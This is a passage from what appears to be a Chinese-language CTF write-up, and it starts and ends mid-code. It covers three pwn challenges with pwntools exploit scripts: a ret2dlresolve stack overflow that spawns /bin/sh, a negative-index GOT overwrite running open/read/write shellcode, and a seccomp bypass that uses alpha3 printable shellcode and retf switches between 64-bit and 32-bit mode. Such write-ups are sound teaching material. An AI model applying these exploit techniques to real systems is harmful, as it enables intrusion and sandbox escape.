        s('\x00' * 0x30)
        #db()
        # make calc error
        s('\x00' * 0x20)
        sl(str(-0xcccccccc))
        #db()
        sl(str(-1))
        # vuln, stack overflow
        rop  = ROP(elf_path)
        buf  = elf.bss()
        pop3 = 0x08049581
        p = b'\x00' * 0x4C
        p += p32(elf.sym['read'])
        p += p32(pop3)
        p += p32(0)
        p += p32(buf)
        p += p32(0x80)
        p += rop.dl_resolve_call(buf + 0x10, buf, 0, 0) # call, args
        sleep(0.5)
        s(p)
        # dl resolve data 
        p = '/bin/sh\x00'.ljust(0x10, '\x00')
        p += rop.dl_resolve_data(buf + 0x10, 'execve')
        p = p.ljust(0x80, '\x00')
        sleep(1)
        sl(p)
        #sleep(0.1)
        #sl(p)
    def finish():
        ia()
        c()
    #--------------------------main-----------------------------    if __name__ == '__main__':
        if LOCAL:
            elf = ELF(elf_path)
            if LIBC:
                libc = ELF(libc_path)
            io = elf.process()
        else:
            elf = ELF(elf_path)
            io = remote(host.split(':')[0], int(host.split(':')[1]))
            if LIBC:
                libc = ELF(libc_path)
        exploit()
        finish()
###  orw
一个伪heap题，开启了沙箱，编辑和打印功能没有，只能开辟两次堆，释放一次，没办法进行堆操作。
存在个index 负数溢出，可以实现修改got表，为堆地址。
    __int64 sub_E44()
    {
      int idx; // [rsp+0h] [rbp-10h]
      int size; // [rsp+4h] [rbp-Ch]
      if ( add_nums = 0 && size >', '1')
        sla(':', str(idx))
        sla(':', str(sz))
        sa(':', d)
    def dp(idx):
        sla('>>', '1')
    def md():
        sla('>>', '1')
    def rm(idx):
        sla('>>', '4')
        sla(':', str(idx))
    #--------------------------exploit--------------------------    def exploit():
        li('exploit...')
        #for i in range(2):
        # wirte
        code = '''
        lea r15, [rip + 0xf9] /* buf */
        mov rdi, r15 /*buf*/
        mov rsi, 0x0 
        mov rdx, 0x0
        mov rax, 2
        syscall
        /*read*/
        mov rdi, 3
        mov rsi, r15
        mov rdx, 0x100
        mov rax, 0
        syscall
        /*write*/
        mov rdi, 1
        mov rax, 1
        syscall
        '''
        p = asm(code, arch = 'amd64')
        p = p.ljust(0x100, b'\x00')
        p += b'./flag\x00'
        ad(-14, 0, p + b'\n')
    #    db()
        # call
        sla('>>', '4')
    def finish():
        ia()
        c()
    exploit()
    finish()
###  shellcode
沙箱检查如下
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000000  A = sys_number
     0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008
     0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008
     0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007
     0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008
     0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008
     0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008
     0007: 0x06 0x00 0x00 0x00000000  return KILL
     0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
输入的shellcode有检查
     for ( i = 0; i < v6; ++i )
     {
        if ( v4[i] <= 31 || v4[i] == '\x7F' )
          goto LABEL_10;
     }
也就是机器码字符小于等于’\x31’的就退出或等于’\x7f’，我们可以采用alpha3工具将机器码生成可显示字符，当然这个工具有限制，机器码不能出现’\x00’，通过调试发现，shellcode的基址存放在rbx上，我们先实现一个输入的shellcode，避免后续不会再进行shellcode过滤。
        code = '''
        mov r15, rbx
        xor rdx, rdx
        add dx, 0x1080
        mov rsi, r15
        add si, 0x120
        xor rax, rax
        syscall
        jmp rsi
        '''
在原来的shellcode + 0x120处实现输入，再跳到那个地方去。
采用alpha3工具生成可显示shellcode如下
    Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8k1L0I3z2m4p4N4p0Y1O3c8L2k4u4v2t0O1L0A400V044p3E0c
当然我也写了个函数方便修改。
    def gen_code():
        fd = open('sc.bin', 'wb')
        code = '''
        mov r15, rbx
        xor rdx, rdx
        add dx, 0x1080
        mov rsi, r15
        add si, 0x120
        xor rax, rax
        syscall
        jmp rsi
        '''
        p = asm(code, arch = 'amd64')
        fd.write(p)
        fd.close()
        cmd = '~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input="./sc.bin"'
        p = os.popen(cmd).read()
        print('shellcode: ' + p)
        return p
然而这个题禁用函数太多了，open和write也禁了，只能切换到32位架构来实现部分绕过了，为了方便实现堆栈，指令储存，我重新申请了个地址段，方便后续实现架构切换方便与数据写入等。
        code = '''
        /*mmap*/
        mov r9d, 0          /* off */
        mov r8d, 0xFFFFFFFF /* fd */ 
        mov r10d, 0x22 /* flags */
        mov edx, 7          /* prot */
        mov esi, 0x1000      /* len */
        mov edi, 0x20000          /* addr */
        mov eax, 9
        syscall 
        /*read 32 shellcode*/
        xor rax, rax
        mov edi, 0
        mov esi, 0x20000
        mov edx, 0x1000 
        syscall
        /*retf to 32*/
        mov rax, 0x2300020000
        push rax
        '''
        p = asm(code, arch = 'amd64')
        p += b'\xCB' # retf
上面是实现向我们开辟到的内存写入数据，再从64位架构切换到32为且跳到我们开辟的内存段中。
后面就是写32位的asm
code了，然而我发现，在32位下，只有一个有用的函数能调用，就是open函数，其他的read，write这些都不能调用了，这又使得重新回到64位下实现读入flag。
        code = '''
        mov esp, 0x20a00
        /*open*/
        mov eax, 5 
        mov ebx, 0x20020
        xor ecx, ecx
        xor edx, edx
        int 0x80
        /*retf to 64*/
        push 0x33
        push 0x20030
        '''
        db()
        p = asm(code, arch = 'i386')
        p += b'\xCB' # retf
        p = p.ljust(0x20, b'\x90')
        p += b'./flag\x00'
        p = p.ljust(0x30, b'\x90')
        code = ''' 
        xor rax, rax
        mov edi, 3
        mov rsi, rsp
        mov edx, 0x100